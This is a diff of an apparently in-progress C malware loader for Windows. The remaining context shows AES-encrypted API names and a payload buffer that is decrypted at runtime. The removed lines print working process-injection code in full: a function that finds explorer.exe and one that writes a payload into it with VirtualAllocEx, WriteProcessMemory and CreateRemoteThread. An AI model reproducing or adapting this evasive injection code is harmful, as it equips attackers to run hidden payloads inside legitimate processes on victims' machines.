@@ -56,54 +56,6 @@ char unsigned cipher_rMoveMemory[] = { 0x98, 0x69, 0xbc, 0xb9, 0x81, 0x86, 0xa7,
 
 //int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
-int findTarget(const char* procname) {
-	HANDLE hProcSnap;
-	PROCESSENTRY32 pe32;
-	int pid = 0;
-
-	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == hProcSnap) {
-		return 0;
-	}
-
-	pe32.dwSize = sizeof(PROCESSENTRY32);
-
-	if (!Process32First(hProcSnap, &pe32)) {
-		CloseHandle(hProcSnap);
-		return 0;
-	}
-
-	while (Process32Next(hProcSnap, &pe32)) {
-		if (lstrcmpiA(procname, (LPSTR)pe32.szExeFile) == 0) {
-			pid = pe32.th32ProcessID;
-			break;
-		}
-	}
-
-	CloseHandle(hProcSnap);
-	return pid;
-}
-
-int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
-
-	// I wanna die
-	LPVOID pRemoteCode = NULL;
-	HANDLE hThread = NULL;
-
-	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
-
-	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
-	if (hThread != NULL) {
-		WaitForSingleObject(hThread, 500);
-		CloseHandle(hThread);
-		return 0;
-	}
-
-	return -1;
-}
-
-
 
 //looking at process injection
 int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
@@ -114,10 +66,6 @@ int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmd
 	DWORD oldprotect = 0;
 
 	unsigned int payload_len = sizeof payload;
-
-	int pid = 0;
-	HANDLE hProc = NULL;
-	pid = findTarget("explorer.exe"); // tbc
 
 	AESDecrypt((char*)cipher_vProtect, sizeof cipher_vProtect, (char*)key, sizeof key);
 	AESDecrypt((char*)cipher_vAlloc, sizeof cipher_vAlloc, (char*)key, sizeof key);
